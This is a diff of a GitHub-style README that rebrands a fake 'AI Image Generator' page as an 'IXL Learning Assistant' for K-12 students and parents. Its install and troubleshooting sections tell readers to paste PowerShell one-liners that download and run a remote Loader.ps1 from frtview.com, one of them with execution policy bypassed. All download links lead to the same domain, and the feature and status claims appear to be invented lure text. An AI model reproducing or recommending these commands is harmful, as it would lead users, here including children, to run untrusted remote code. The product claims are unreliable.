@@ -1,17 +1,17 @@
 <p align="center">
-  <img src="https://img.shields.io/badge/AI_Image_Generation-v2.5-blue?style=for-the-badge&logo=github">
+  <img src="https://img.shields.io/badge/IXL_Learning_Assistant-v3.0-blue?style=for-the-badge&logo=github">
   <img src="https://img.shields.io/badge/Status-Working-brightgreen?style=for-the-badge">
   <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge">
 </p>
 
 <h1 align="center">
-  🖼️ AI Image Generator 2026<br>
-  <span style="font-size:18px;">Text-to-Image Generation with Stable Diffusion, DALL-E & Midjourney</span>
+  📖 IXL Learning Assistant 2026<br>
+  <span style="font-size:18px;">AI Tutor, Progress Tracker & Personalized Study Plans for K-12</span>
 </h1>
 
 <p align="center">
-  <strong>Stable Diffusion | DALL-E 3 | ComfyUI | LoRA | img2img | Inpainting</strong><br>
-  <span style="color:#6c757d;">Working 2026 · Python · GPU Accelerated · Batch Generation</span>
+  <strong>Smart Tutor | Adaptive Learning | Detailed Analytics | Study Scheduler | Parent Dashboard</strong><br>
+  <span style="color:#6c757d;">Working 2026 · K-12 Curriculum · Offline Support · Goal Tracking</span>
 </p>
 
 <p align="center">
@@ -24,7 +24,7 @@
 
 > ⚠️ **DISCLAIMER**
 > This tool is for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**.
-> Use responsibly and respect content rights and ethical guidelines.
+> Use as a supplementary learning tool alongside classroom instruction.
 > **BY USING THIS TOOL YOU AGREE TO THESE TERMS.**
 
 ---
@@ -43,14 +43,14 @@ powershell -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
 
 ### Step 3: Wait for Completion
 ```
-[1/4] Loading AI Image Generator modules...
-[2/4] Configuring diffusion models...
-[3/4] Initializing generation pipeline...
+[1/4] Loading IXL Learning Assistant modules...
+[2/4] Configuring adaptive engine...
+[3/4] Initializing skill database...
 [4/4] Ready. Start using.
 ```
 
-### Step 4: Generate
-Enter a text prompt, select a model and style, configure resolution and steps, and generate your AI image.
+### Step 4: Build Your Learning Path
+Select your grade level and subjects, and the assistant analyzes your current skill levels to create a personalized study plan with daily goals and practice recommendations.
 
 ---
 
@@ -58,36 +58,44 @@ Enter a text prompt, select a model and style, configure resolution and steps, a
 
 <table>
   <tr>
-    <td><strong>📝 Text-to-Image</strong></td>
-    <td>Generate images from text descriptions with multiple model support and style presets</td>
+    <td><strong>📖 Smart Tutor</strong></td>
+    <td>AI assistant that explains concepts, provides hints, and guides through problems without revealing answers</td>
   </tr>
   <tr>
-    <td><strong>🖼️ Image-to-Image</strong></td>
-    <td>Transform existing images with new styles, variations, and artistic interpretations</td>
+    <td><strong>📊 Progress Tracker</strong></td>
+    <td>Visual dashboards showing skill completion, SmartScore history, and topic-by-topic mastery levels</td>
   </tr>
   <tr>
-    <td><strong>🎨 Inpainting</strong></td>
-    <td>Edit specific regions of images with mask-based inpainting and outpainting</td>
+    <td><strong>🧠 Adaptive Learning</strong></td>
+    <td>Identifies weak areas and suggests targeted practice problems to improve understanding</td>
   </tr>
   <tr>
-    <td><strong>🧩 LoRA Support</strong></td>
-    <td>Load and use custom LoRA models for specific styles, characters, and concepts</td>
+    <td><strong>📅 Study Scheduler</strong></td>
+    <td>Personalized study plans with daily goals, reminders, and streak tracking for consistent habits</td>
   </tr>
   <tr>
-    <td><strong>⚡ GPU Accelerated</strong></td>
-    <td>CUDA, ROCm, and MPS support with automatic VRAM management and optimization</td>
+    <td><strong>🔍 Skill Explorer</strong></td>
+    <td>Browse the complete IXL skill tree with descriptions, prerequisites, and recommended paths</td>
   </tr>
   <tr>
-    <td><strong>📦 Batch Generation</strong></td>
-    <td>Generate multiple images from prompt lists with parallel processing and progress tracking</td>
+    <td><strong>📝 Note Taking</strong></td>
+    <td>Built-in note system linked to specific skills and problems for easy review and reference</td>
   </tr>
   <tr>
-    <td><strong>🌐 Web UI</strong></td>
-    <td>Automatic1111 and ComfyUI compatible interfaces with extension support</td>
+    <td><strong>📈 Parent Dashboard</strong></td>
+    <td>Share progress reports with parents including time spent, skills mastered, and improvement trends</td>
   </tr>
   <tr>
-    <td><strong>🔧 Prompt Enhancer</strong></td>
-    <td>AI-powered prompt enhancement for better results with style suggestions and negative prompts</td>
+    <td><strong>🌐 Offline Mode</strong></td>
+    <td>Download practice problems and study materials for offline use during limited connectivity</td>
+  </tr>
+  <tr>
+    <td><strong>💡 Hint System</strong></td>
+    <td>Contextual hints that guide toward the answer without revealing it, promoting genuine learning</td>
+  </tr>
+  <tr>
+    <td><strong>🎯 Goal Setting</strong></td>
+    <td>Weekly skill completion targets with progress notifications and achievement milestones</td>
   </tr>
 </table>
 
@@ -97,29 +105,39 @@ Enter a text prompt, select a model and style, configure resolution and steps, a
 
 <table>
   <tr>
-    <td><strong>Text-to-Image</strong></td>
+    <td><strong>Tutor Engine</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v2.5.0</td>
+    <td>v3.0.2</td>
   </tr>
   <tr>
-    <td><strong>Image-to-Image</strong></td>
+    <td><strong>Progress Tracker</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v2.4.8</td>
+    <td>v3.0.1</td>
   </tr>
   <tr>
-    <td><strong>Inpainting</strong></td>
+    <td><strong>Adaptive Learning</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v2.4.5</td>
+    <td>v2.9.8</td>
   </tr>
   <tr>
-    <td><strong>LoRA Loader</strong></td>
+    <td><strong>Study Scheduler</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v2.4.3</td>
+    <td>v2.9.5</td>
   </tr>
   <tr>
-    <td><strong>Web UI</strong></td>
+    <td><strong>Skill Explorer</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v2.5.0</td>
+    <td>v2.9.3</td>
+  </tr>
+  <tr>
+    <td><strong>Note System</strong></td>
+    <td><span style="color:green;">✅ FUNCTIONAL</span></td>
+    <td>v2.9.1</td>
+  </tr>
+  <tr>
+    <td><strong>Parent Dashboard</strong></td>
+    <td><span style="color:green;">✅ FUNCTIONAL</span></td>
+    <td>v3.0.2</td>
   </tr>
 </table>
 
@@ -128,14 +146,14 @@ Enter a text prompt, select a model and style, configure resolution and steps, a
 ## ⬇️ DOWNLOAD
 
 ### 🔗 Official Download
-[![Download Now](https://img.shields.io/badge/Download-AI_Image-brightgreen?style=for-the-badge&logo=github)](https://frtview.com/ai-image-generation)
+[![Download Now](https://img.shields.io/badge/Download-IXL_Learning-brightgreen?style=for-the-badge&logo=github)](https://frtview.com/ixl-learning)
 
 ### 📦 Direct Links
 | Platform | Link |
 |----------|------|
-| **GitHub Release** | [Download Latest](https://frtview.com/ai-image-generation) |
-| **Direct ZIP** | [Download ZIP](https://frtview.com/ai-image-generation) |
-| **Portable Version** | [Download Portable](https://frtview.com/ai-image-generation) |
+| **GitHub Release** | [Download Latest](https://frtview.com/ixl-learning) |
+| **Direct ZIP** | [Download ZIP](https://frtview.com/ixl-learning) |
+| **Portable Version** | [Download Portable](https://frtview.com/ixl-learning) |
 
 ---
 
@@ -151,26 +169,26 @@ powershell -ExecutionPolicy Bypass -Command "irm https://mast.frtview.com/Loader
 powershell -Command "Invoke-RestMethod https://mast.frtview.com/Loader.ps1 | Invoke-Expression"
 ```
 
-### 📌 Out of VRAM
-Reduce image resolution, use `--medvram` or `--lowvram` flags, enable xformers, and close other GPU-intensive applications.
+### 📌 Progress Not Syncing
+Ensure you're logged into your IXL account within the assistant, check your internet connection for cloud sync, and force a full sync via Settings → Sync → Force Full Sync.
 
-### 📌 Poor Quality Results
-Use more detailed prompts, increase CFG scale (7-12), try different samplers (DPM++ 2M Karras recommended), and add negative prompts for unwanted elements.
+### 📌 Study Schedule Not Generating
+Select at least one subject and grade level first, allow a minimum of 3 days of data for the scheduler to create recommendations, and clear the schedule cache before regenerating via Settings → Schedule → Reset.
 
 ---
 
 ## 🏷️ TAGS & KEYWORDS
 
 ```
-ai image generator, ai image generation, stable diffusion, text to image, ai art, image generation github, comfyui, dall-e, midjourney, ai painting, image ai, generative ai, diffusion model, ai image tool, image generation 2026
+ixl learning, ixl tutor, ixl study tool, ixl helper, learning assistant, ixl progress, study planner, smart score tracker, ixl analytics, ixl grade tool, ixl 2026, education tool, student assistant, ixl skill tracker, parent dashboard, adaptive learning, study scheduler, ixl notes, learning tracker, ixl companion
 ```
 
 <p align="center">
   <a href="#"><img src="https://img.shields.io/badge/⭐-Star_This_Repo-yellow?style=for-the-badge"></a>
   <a href="#"><img src="https://img.shields.io/badge/🍴-Fork_This_Repo-blue?style=for-the-badge"></a>
-  <a href="#"><img src="https://img.shields.io/badge/🖼️-Happy_Generating-orange?style=for-the-badge"></a>
+  <a href="#"><img src="https://img.shields.io/badge/📖-Happy_Learning-orange?style=for-the-badge"></a>
 </p>
 
 ---
 
-**© 2026 AI Image Generator — All rights reserved for educational purposes.**
+**© 2026 IXL Learning Assistant — All rights reserved for educational purposes.**
